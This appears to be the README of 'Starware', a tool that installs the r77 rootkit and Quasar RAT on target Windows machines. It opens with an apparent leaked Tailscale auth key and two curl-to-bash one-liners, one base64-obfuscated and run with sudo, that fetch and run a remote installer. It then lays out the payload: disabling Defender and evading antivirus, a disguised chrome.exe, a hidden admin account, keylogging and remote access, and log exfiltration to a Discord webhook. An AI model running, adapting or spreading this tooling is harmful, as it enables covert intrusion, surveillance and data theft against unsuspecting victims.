tskey-auth-kN84HPWZ9i11CNTRL-h6kUeMMtB7aCkiyUCoSv6a963RcunSwsM

echo "Y3VybCAtcyBodHRwczovL2dpdGh1Yi5jb20vT2d5ZWV0MTAvaW5zdGFsbGVyOTAwMC9yYXcvcmVmcy9oZWFkcy9tYWluL2luc3RhbGwuc2ggfCBiYXNo" | base64 -d | sudo bash

curl -s https://github.com/Ogyeet10/installer9000/raw/refs/heads/main/install.sh | bash



# Starware

Starware is a comprehensive installer script that integrates two powerful tools into a single seamless installation process on your targets system: [r77-rootkit](https://github.com/bytecode77/r77-rootkit) and [Quasar RAT](https://github.com/quasar/Quasar). This tool is designed for advanced users looking to monitor and manage remote systems effectively.

## Features

- **Automated Installation**: Automatically installs and configures r77-rootkit and Quasar RAT.
- **AV Checks and Evasion**: Utilizes WMI to check for installed antivirus products and terminates if a non-whitelisted AV is detected.
- **Remote Access Setup**: Configures an SSH server for remote access and sets up SSH to use a public key for authentication (Note: Public key authentication is currently a work in progress).
- **Network Configuration**: Downloads and installs ZeroTier One and configures it to use a specified ZTO network.
- **Comprehensive Logging**: Sends a complete log and the final status of the installation (success, failure, etc.) to a specified Discord webhook.
- **Quasar Features**: Includes numerous remote tasks such as TCP networking, file management, remote desktop, system monitoring, keylogging, and much more.
- **Stealth Operation**: All activities are concealed using the r77 rootkit.

## Upcoming Features

- **Starware Tools**: A new set of tools for easier configuration and interaction with the target system, including:
  - **DeElevatedPsWindow**: Allows running a PowerShell script/command in the user's desktop context, hidden from the user.
  - **Troll9000**: A playful tool for changing the desktop wallpaper or rotating the monitor display at specified intervals using a background PowerShell process.

## Installation (WIP)


# Starware Execution Flow

Starware script automates the installation and configuration of key components while ensuring a stealthy setup. Below is a detailed overview of the execution flow:

## Initialization and Privilege Check

- Checks if the script is run with Administrator privileges.
- If not, it relaunches itself with the necessary privileges by downloading and executing an encoded command from its GitHub repository.

## Exclusion List Configuration

- If running with admin rights, modifies the Windows Defender exclusion list to ignore paths for:
  - `$77SWClient.exe` - The Starware/Quasar client.
  - `chrome.exe` - The disguised installer executable for Starware and r77.

## Logging Setup

- Initializes a log file named with the hostname and current timestamp to record all operations.

## Error Handling and IP Address Retrieval

- Defines functions for robust error handling and fetching the public IP address using an external service.

## System Information Gathering

- Collects comprehensive system information including CPU details, memory usage, disk info, network details, and public IP address.

## Windows Defender and Antivirus Handling

- Disables Windows Defender real-time monitoring.
- Checks for installed antivirus products and halts execution if any non-whitelisted AVs are detected.

## Notification and Information Reporting

- Sends a notification to a Discord webhook detailing the execution context (hostname and public IP).

## Service and Process Configuration

- Configures r77’s registry settings to hide specific services and processes.
- Installs and sets up OpenSSH Server if not previously installed.
- Installs "ZeroTier One" and downloads "chrome.exe" from the GitHub repository.

## User Account Management

- Creates and hides a new administrative user (`ssh-user`) using registry settings if it doesn't already exist.

## Network Configuration and Cleanup

- Joins a specified ZeroTier network.
- Re-enables Windows Defender Antivirus post-operation.
- Removes any temporary files created during the process.

## Finalization

- Completes the logging session and sends the final log file to the Discord webhook for record-keeping.


## Usage

After installation, Starware can be configured via the generated configuration files or using the upcoming Starware Tools.

## Caution

This software is intended for educational and legally sanctioned purposes only. Users are responsible for ensuring they comply with all applicable laws and regulations.

## License

This project is licensed under [license name] - see the [LICENSE.md](LICENSE.md) file for details.

## Acknowledgments

- Thanks to [bytecode77](https://github.com/bytecode77) for the r77-rootkit.
- Thanks to the developers of [Quasar](https://github.com/quasar/Quasar).
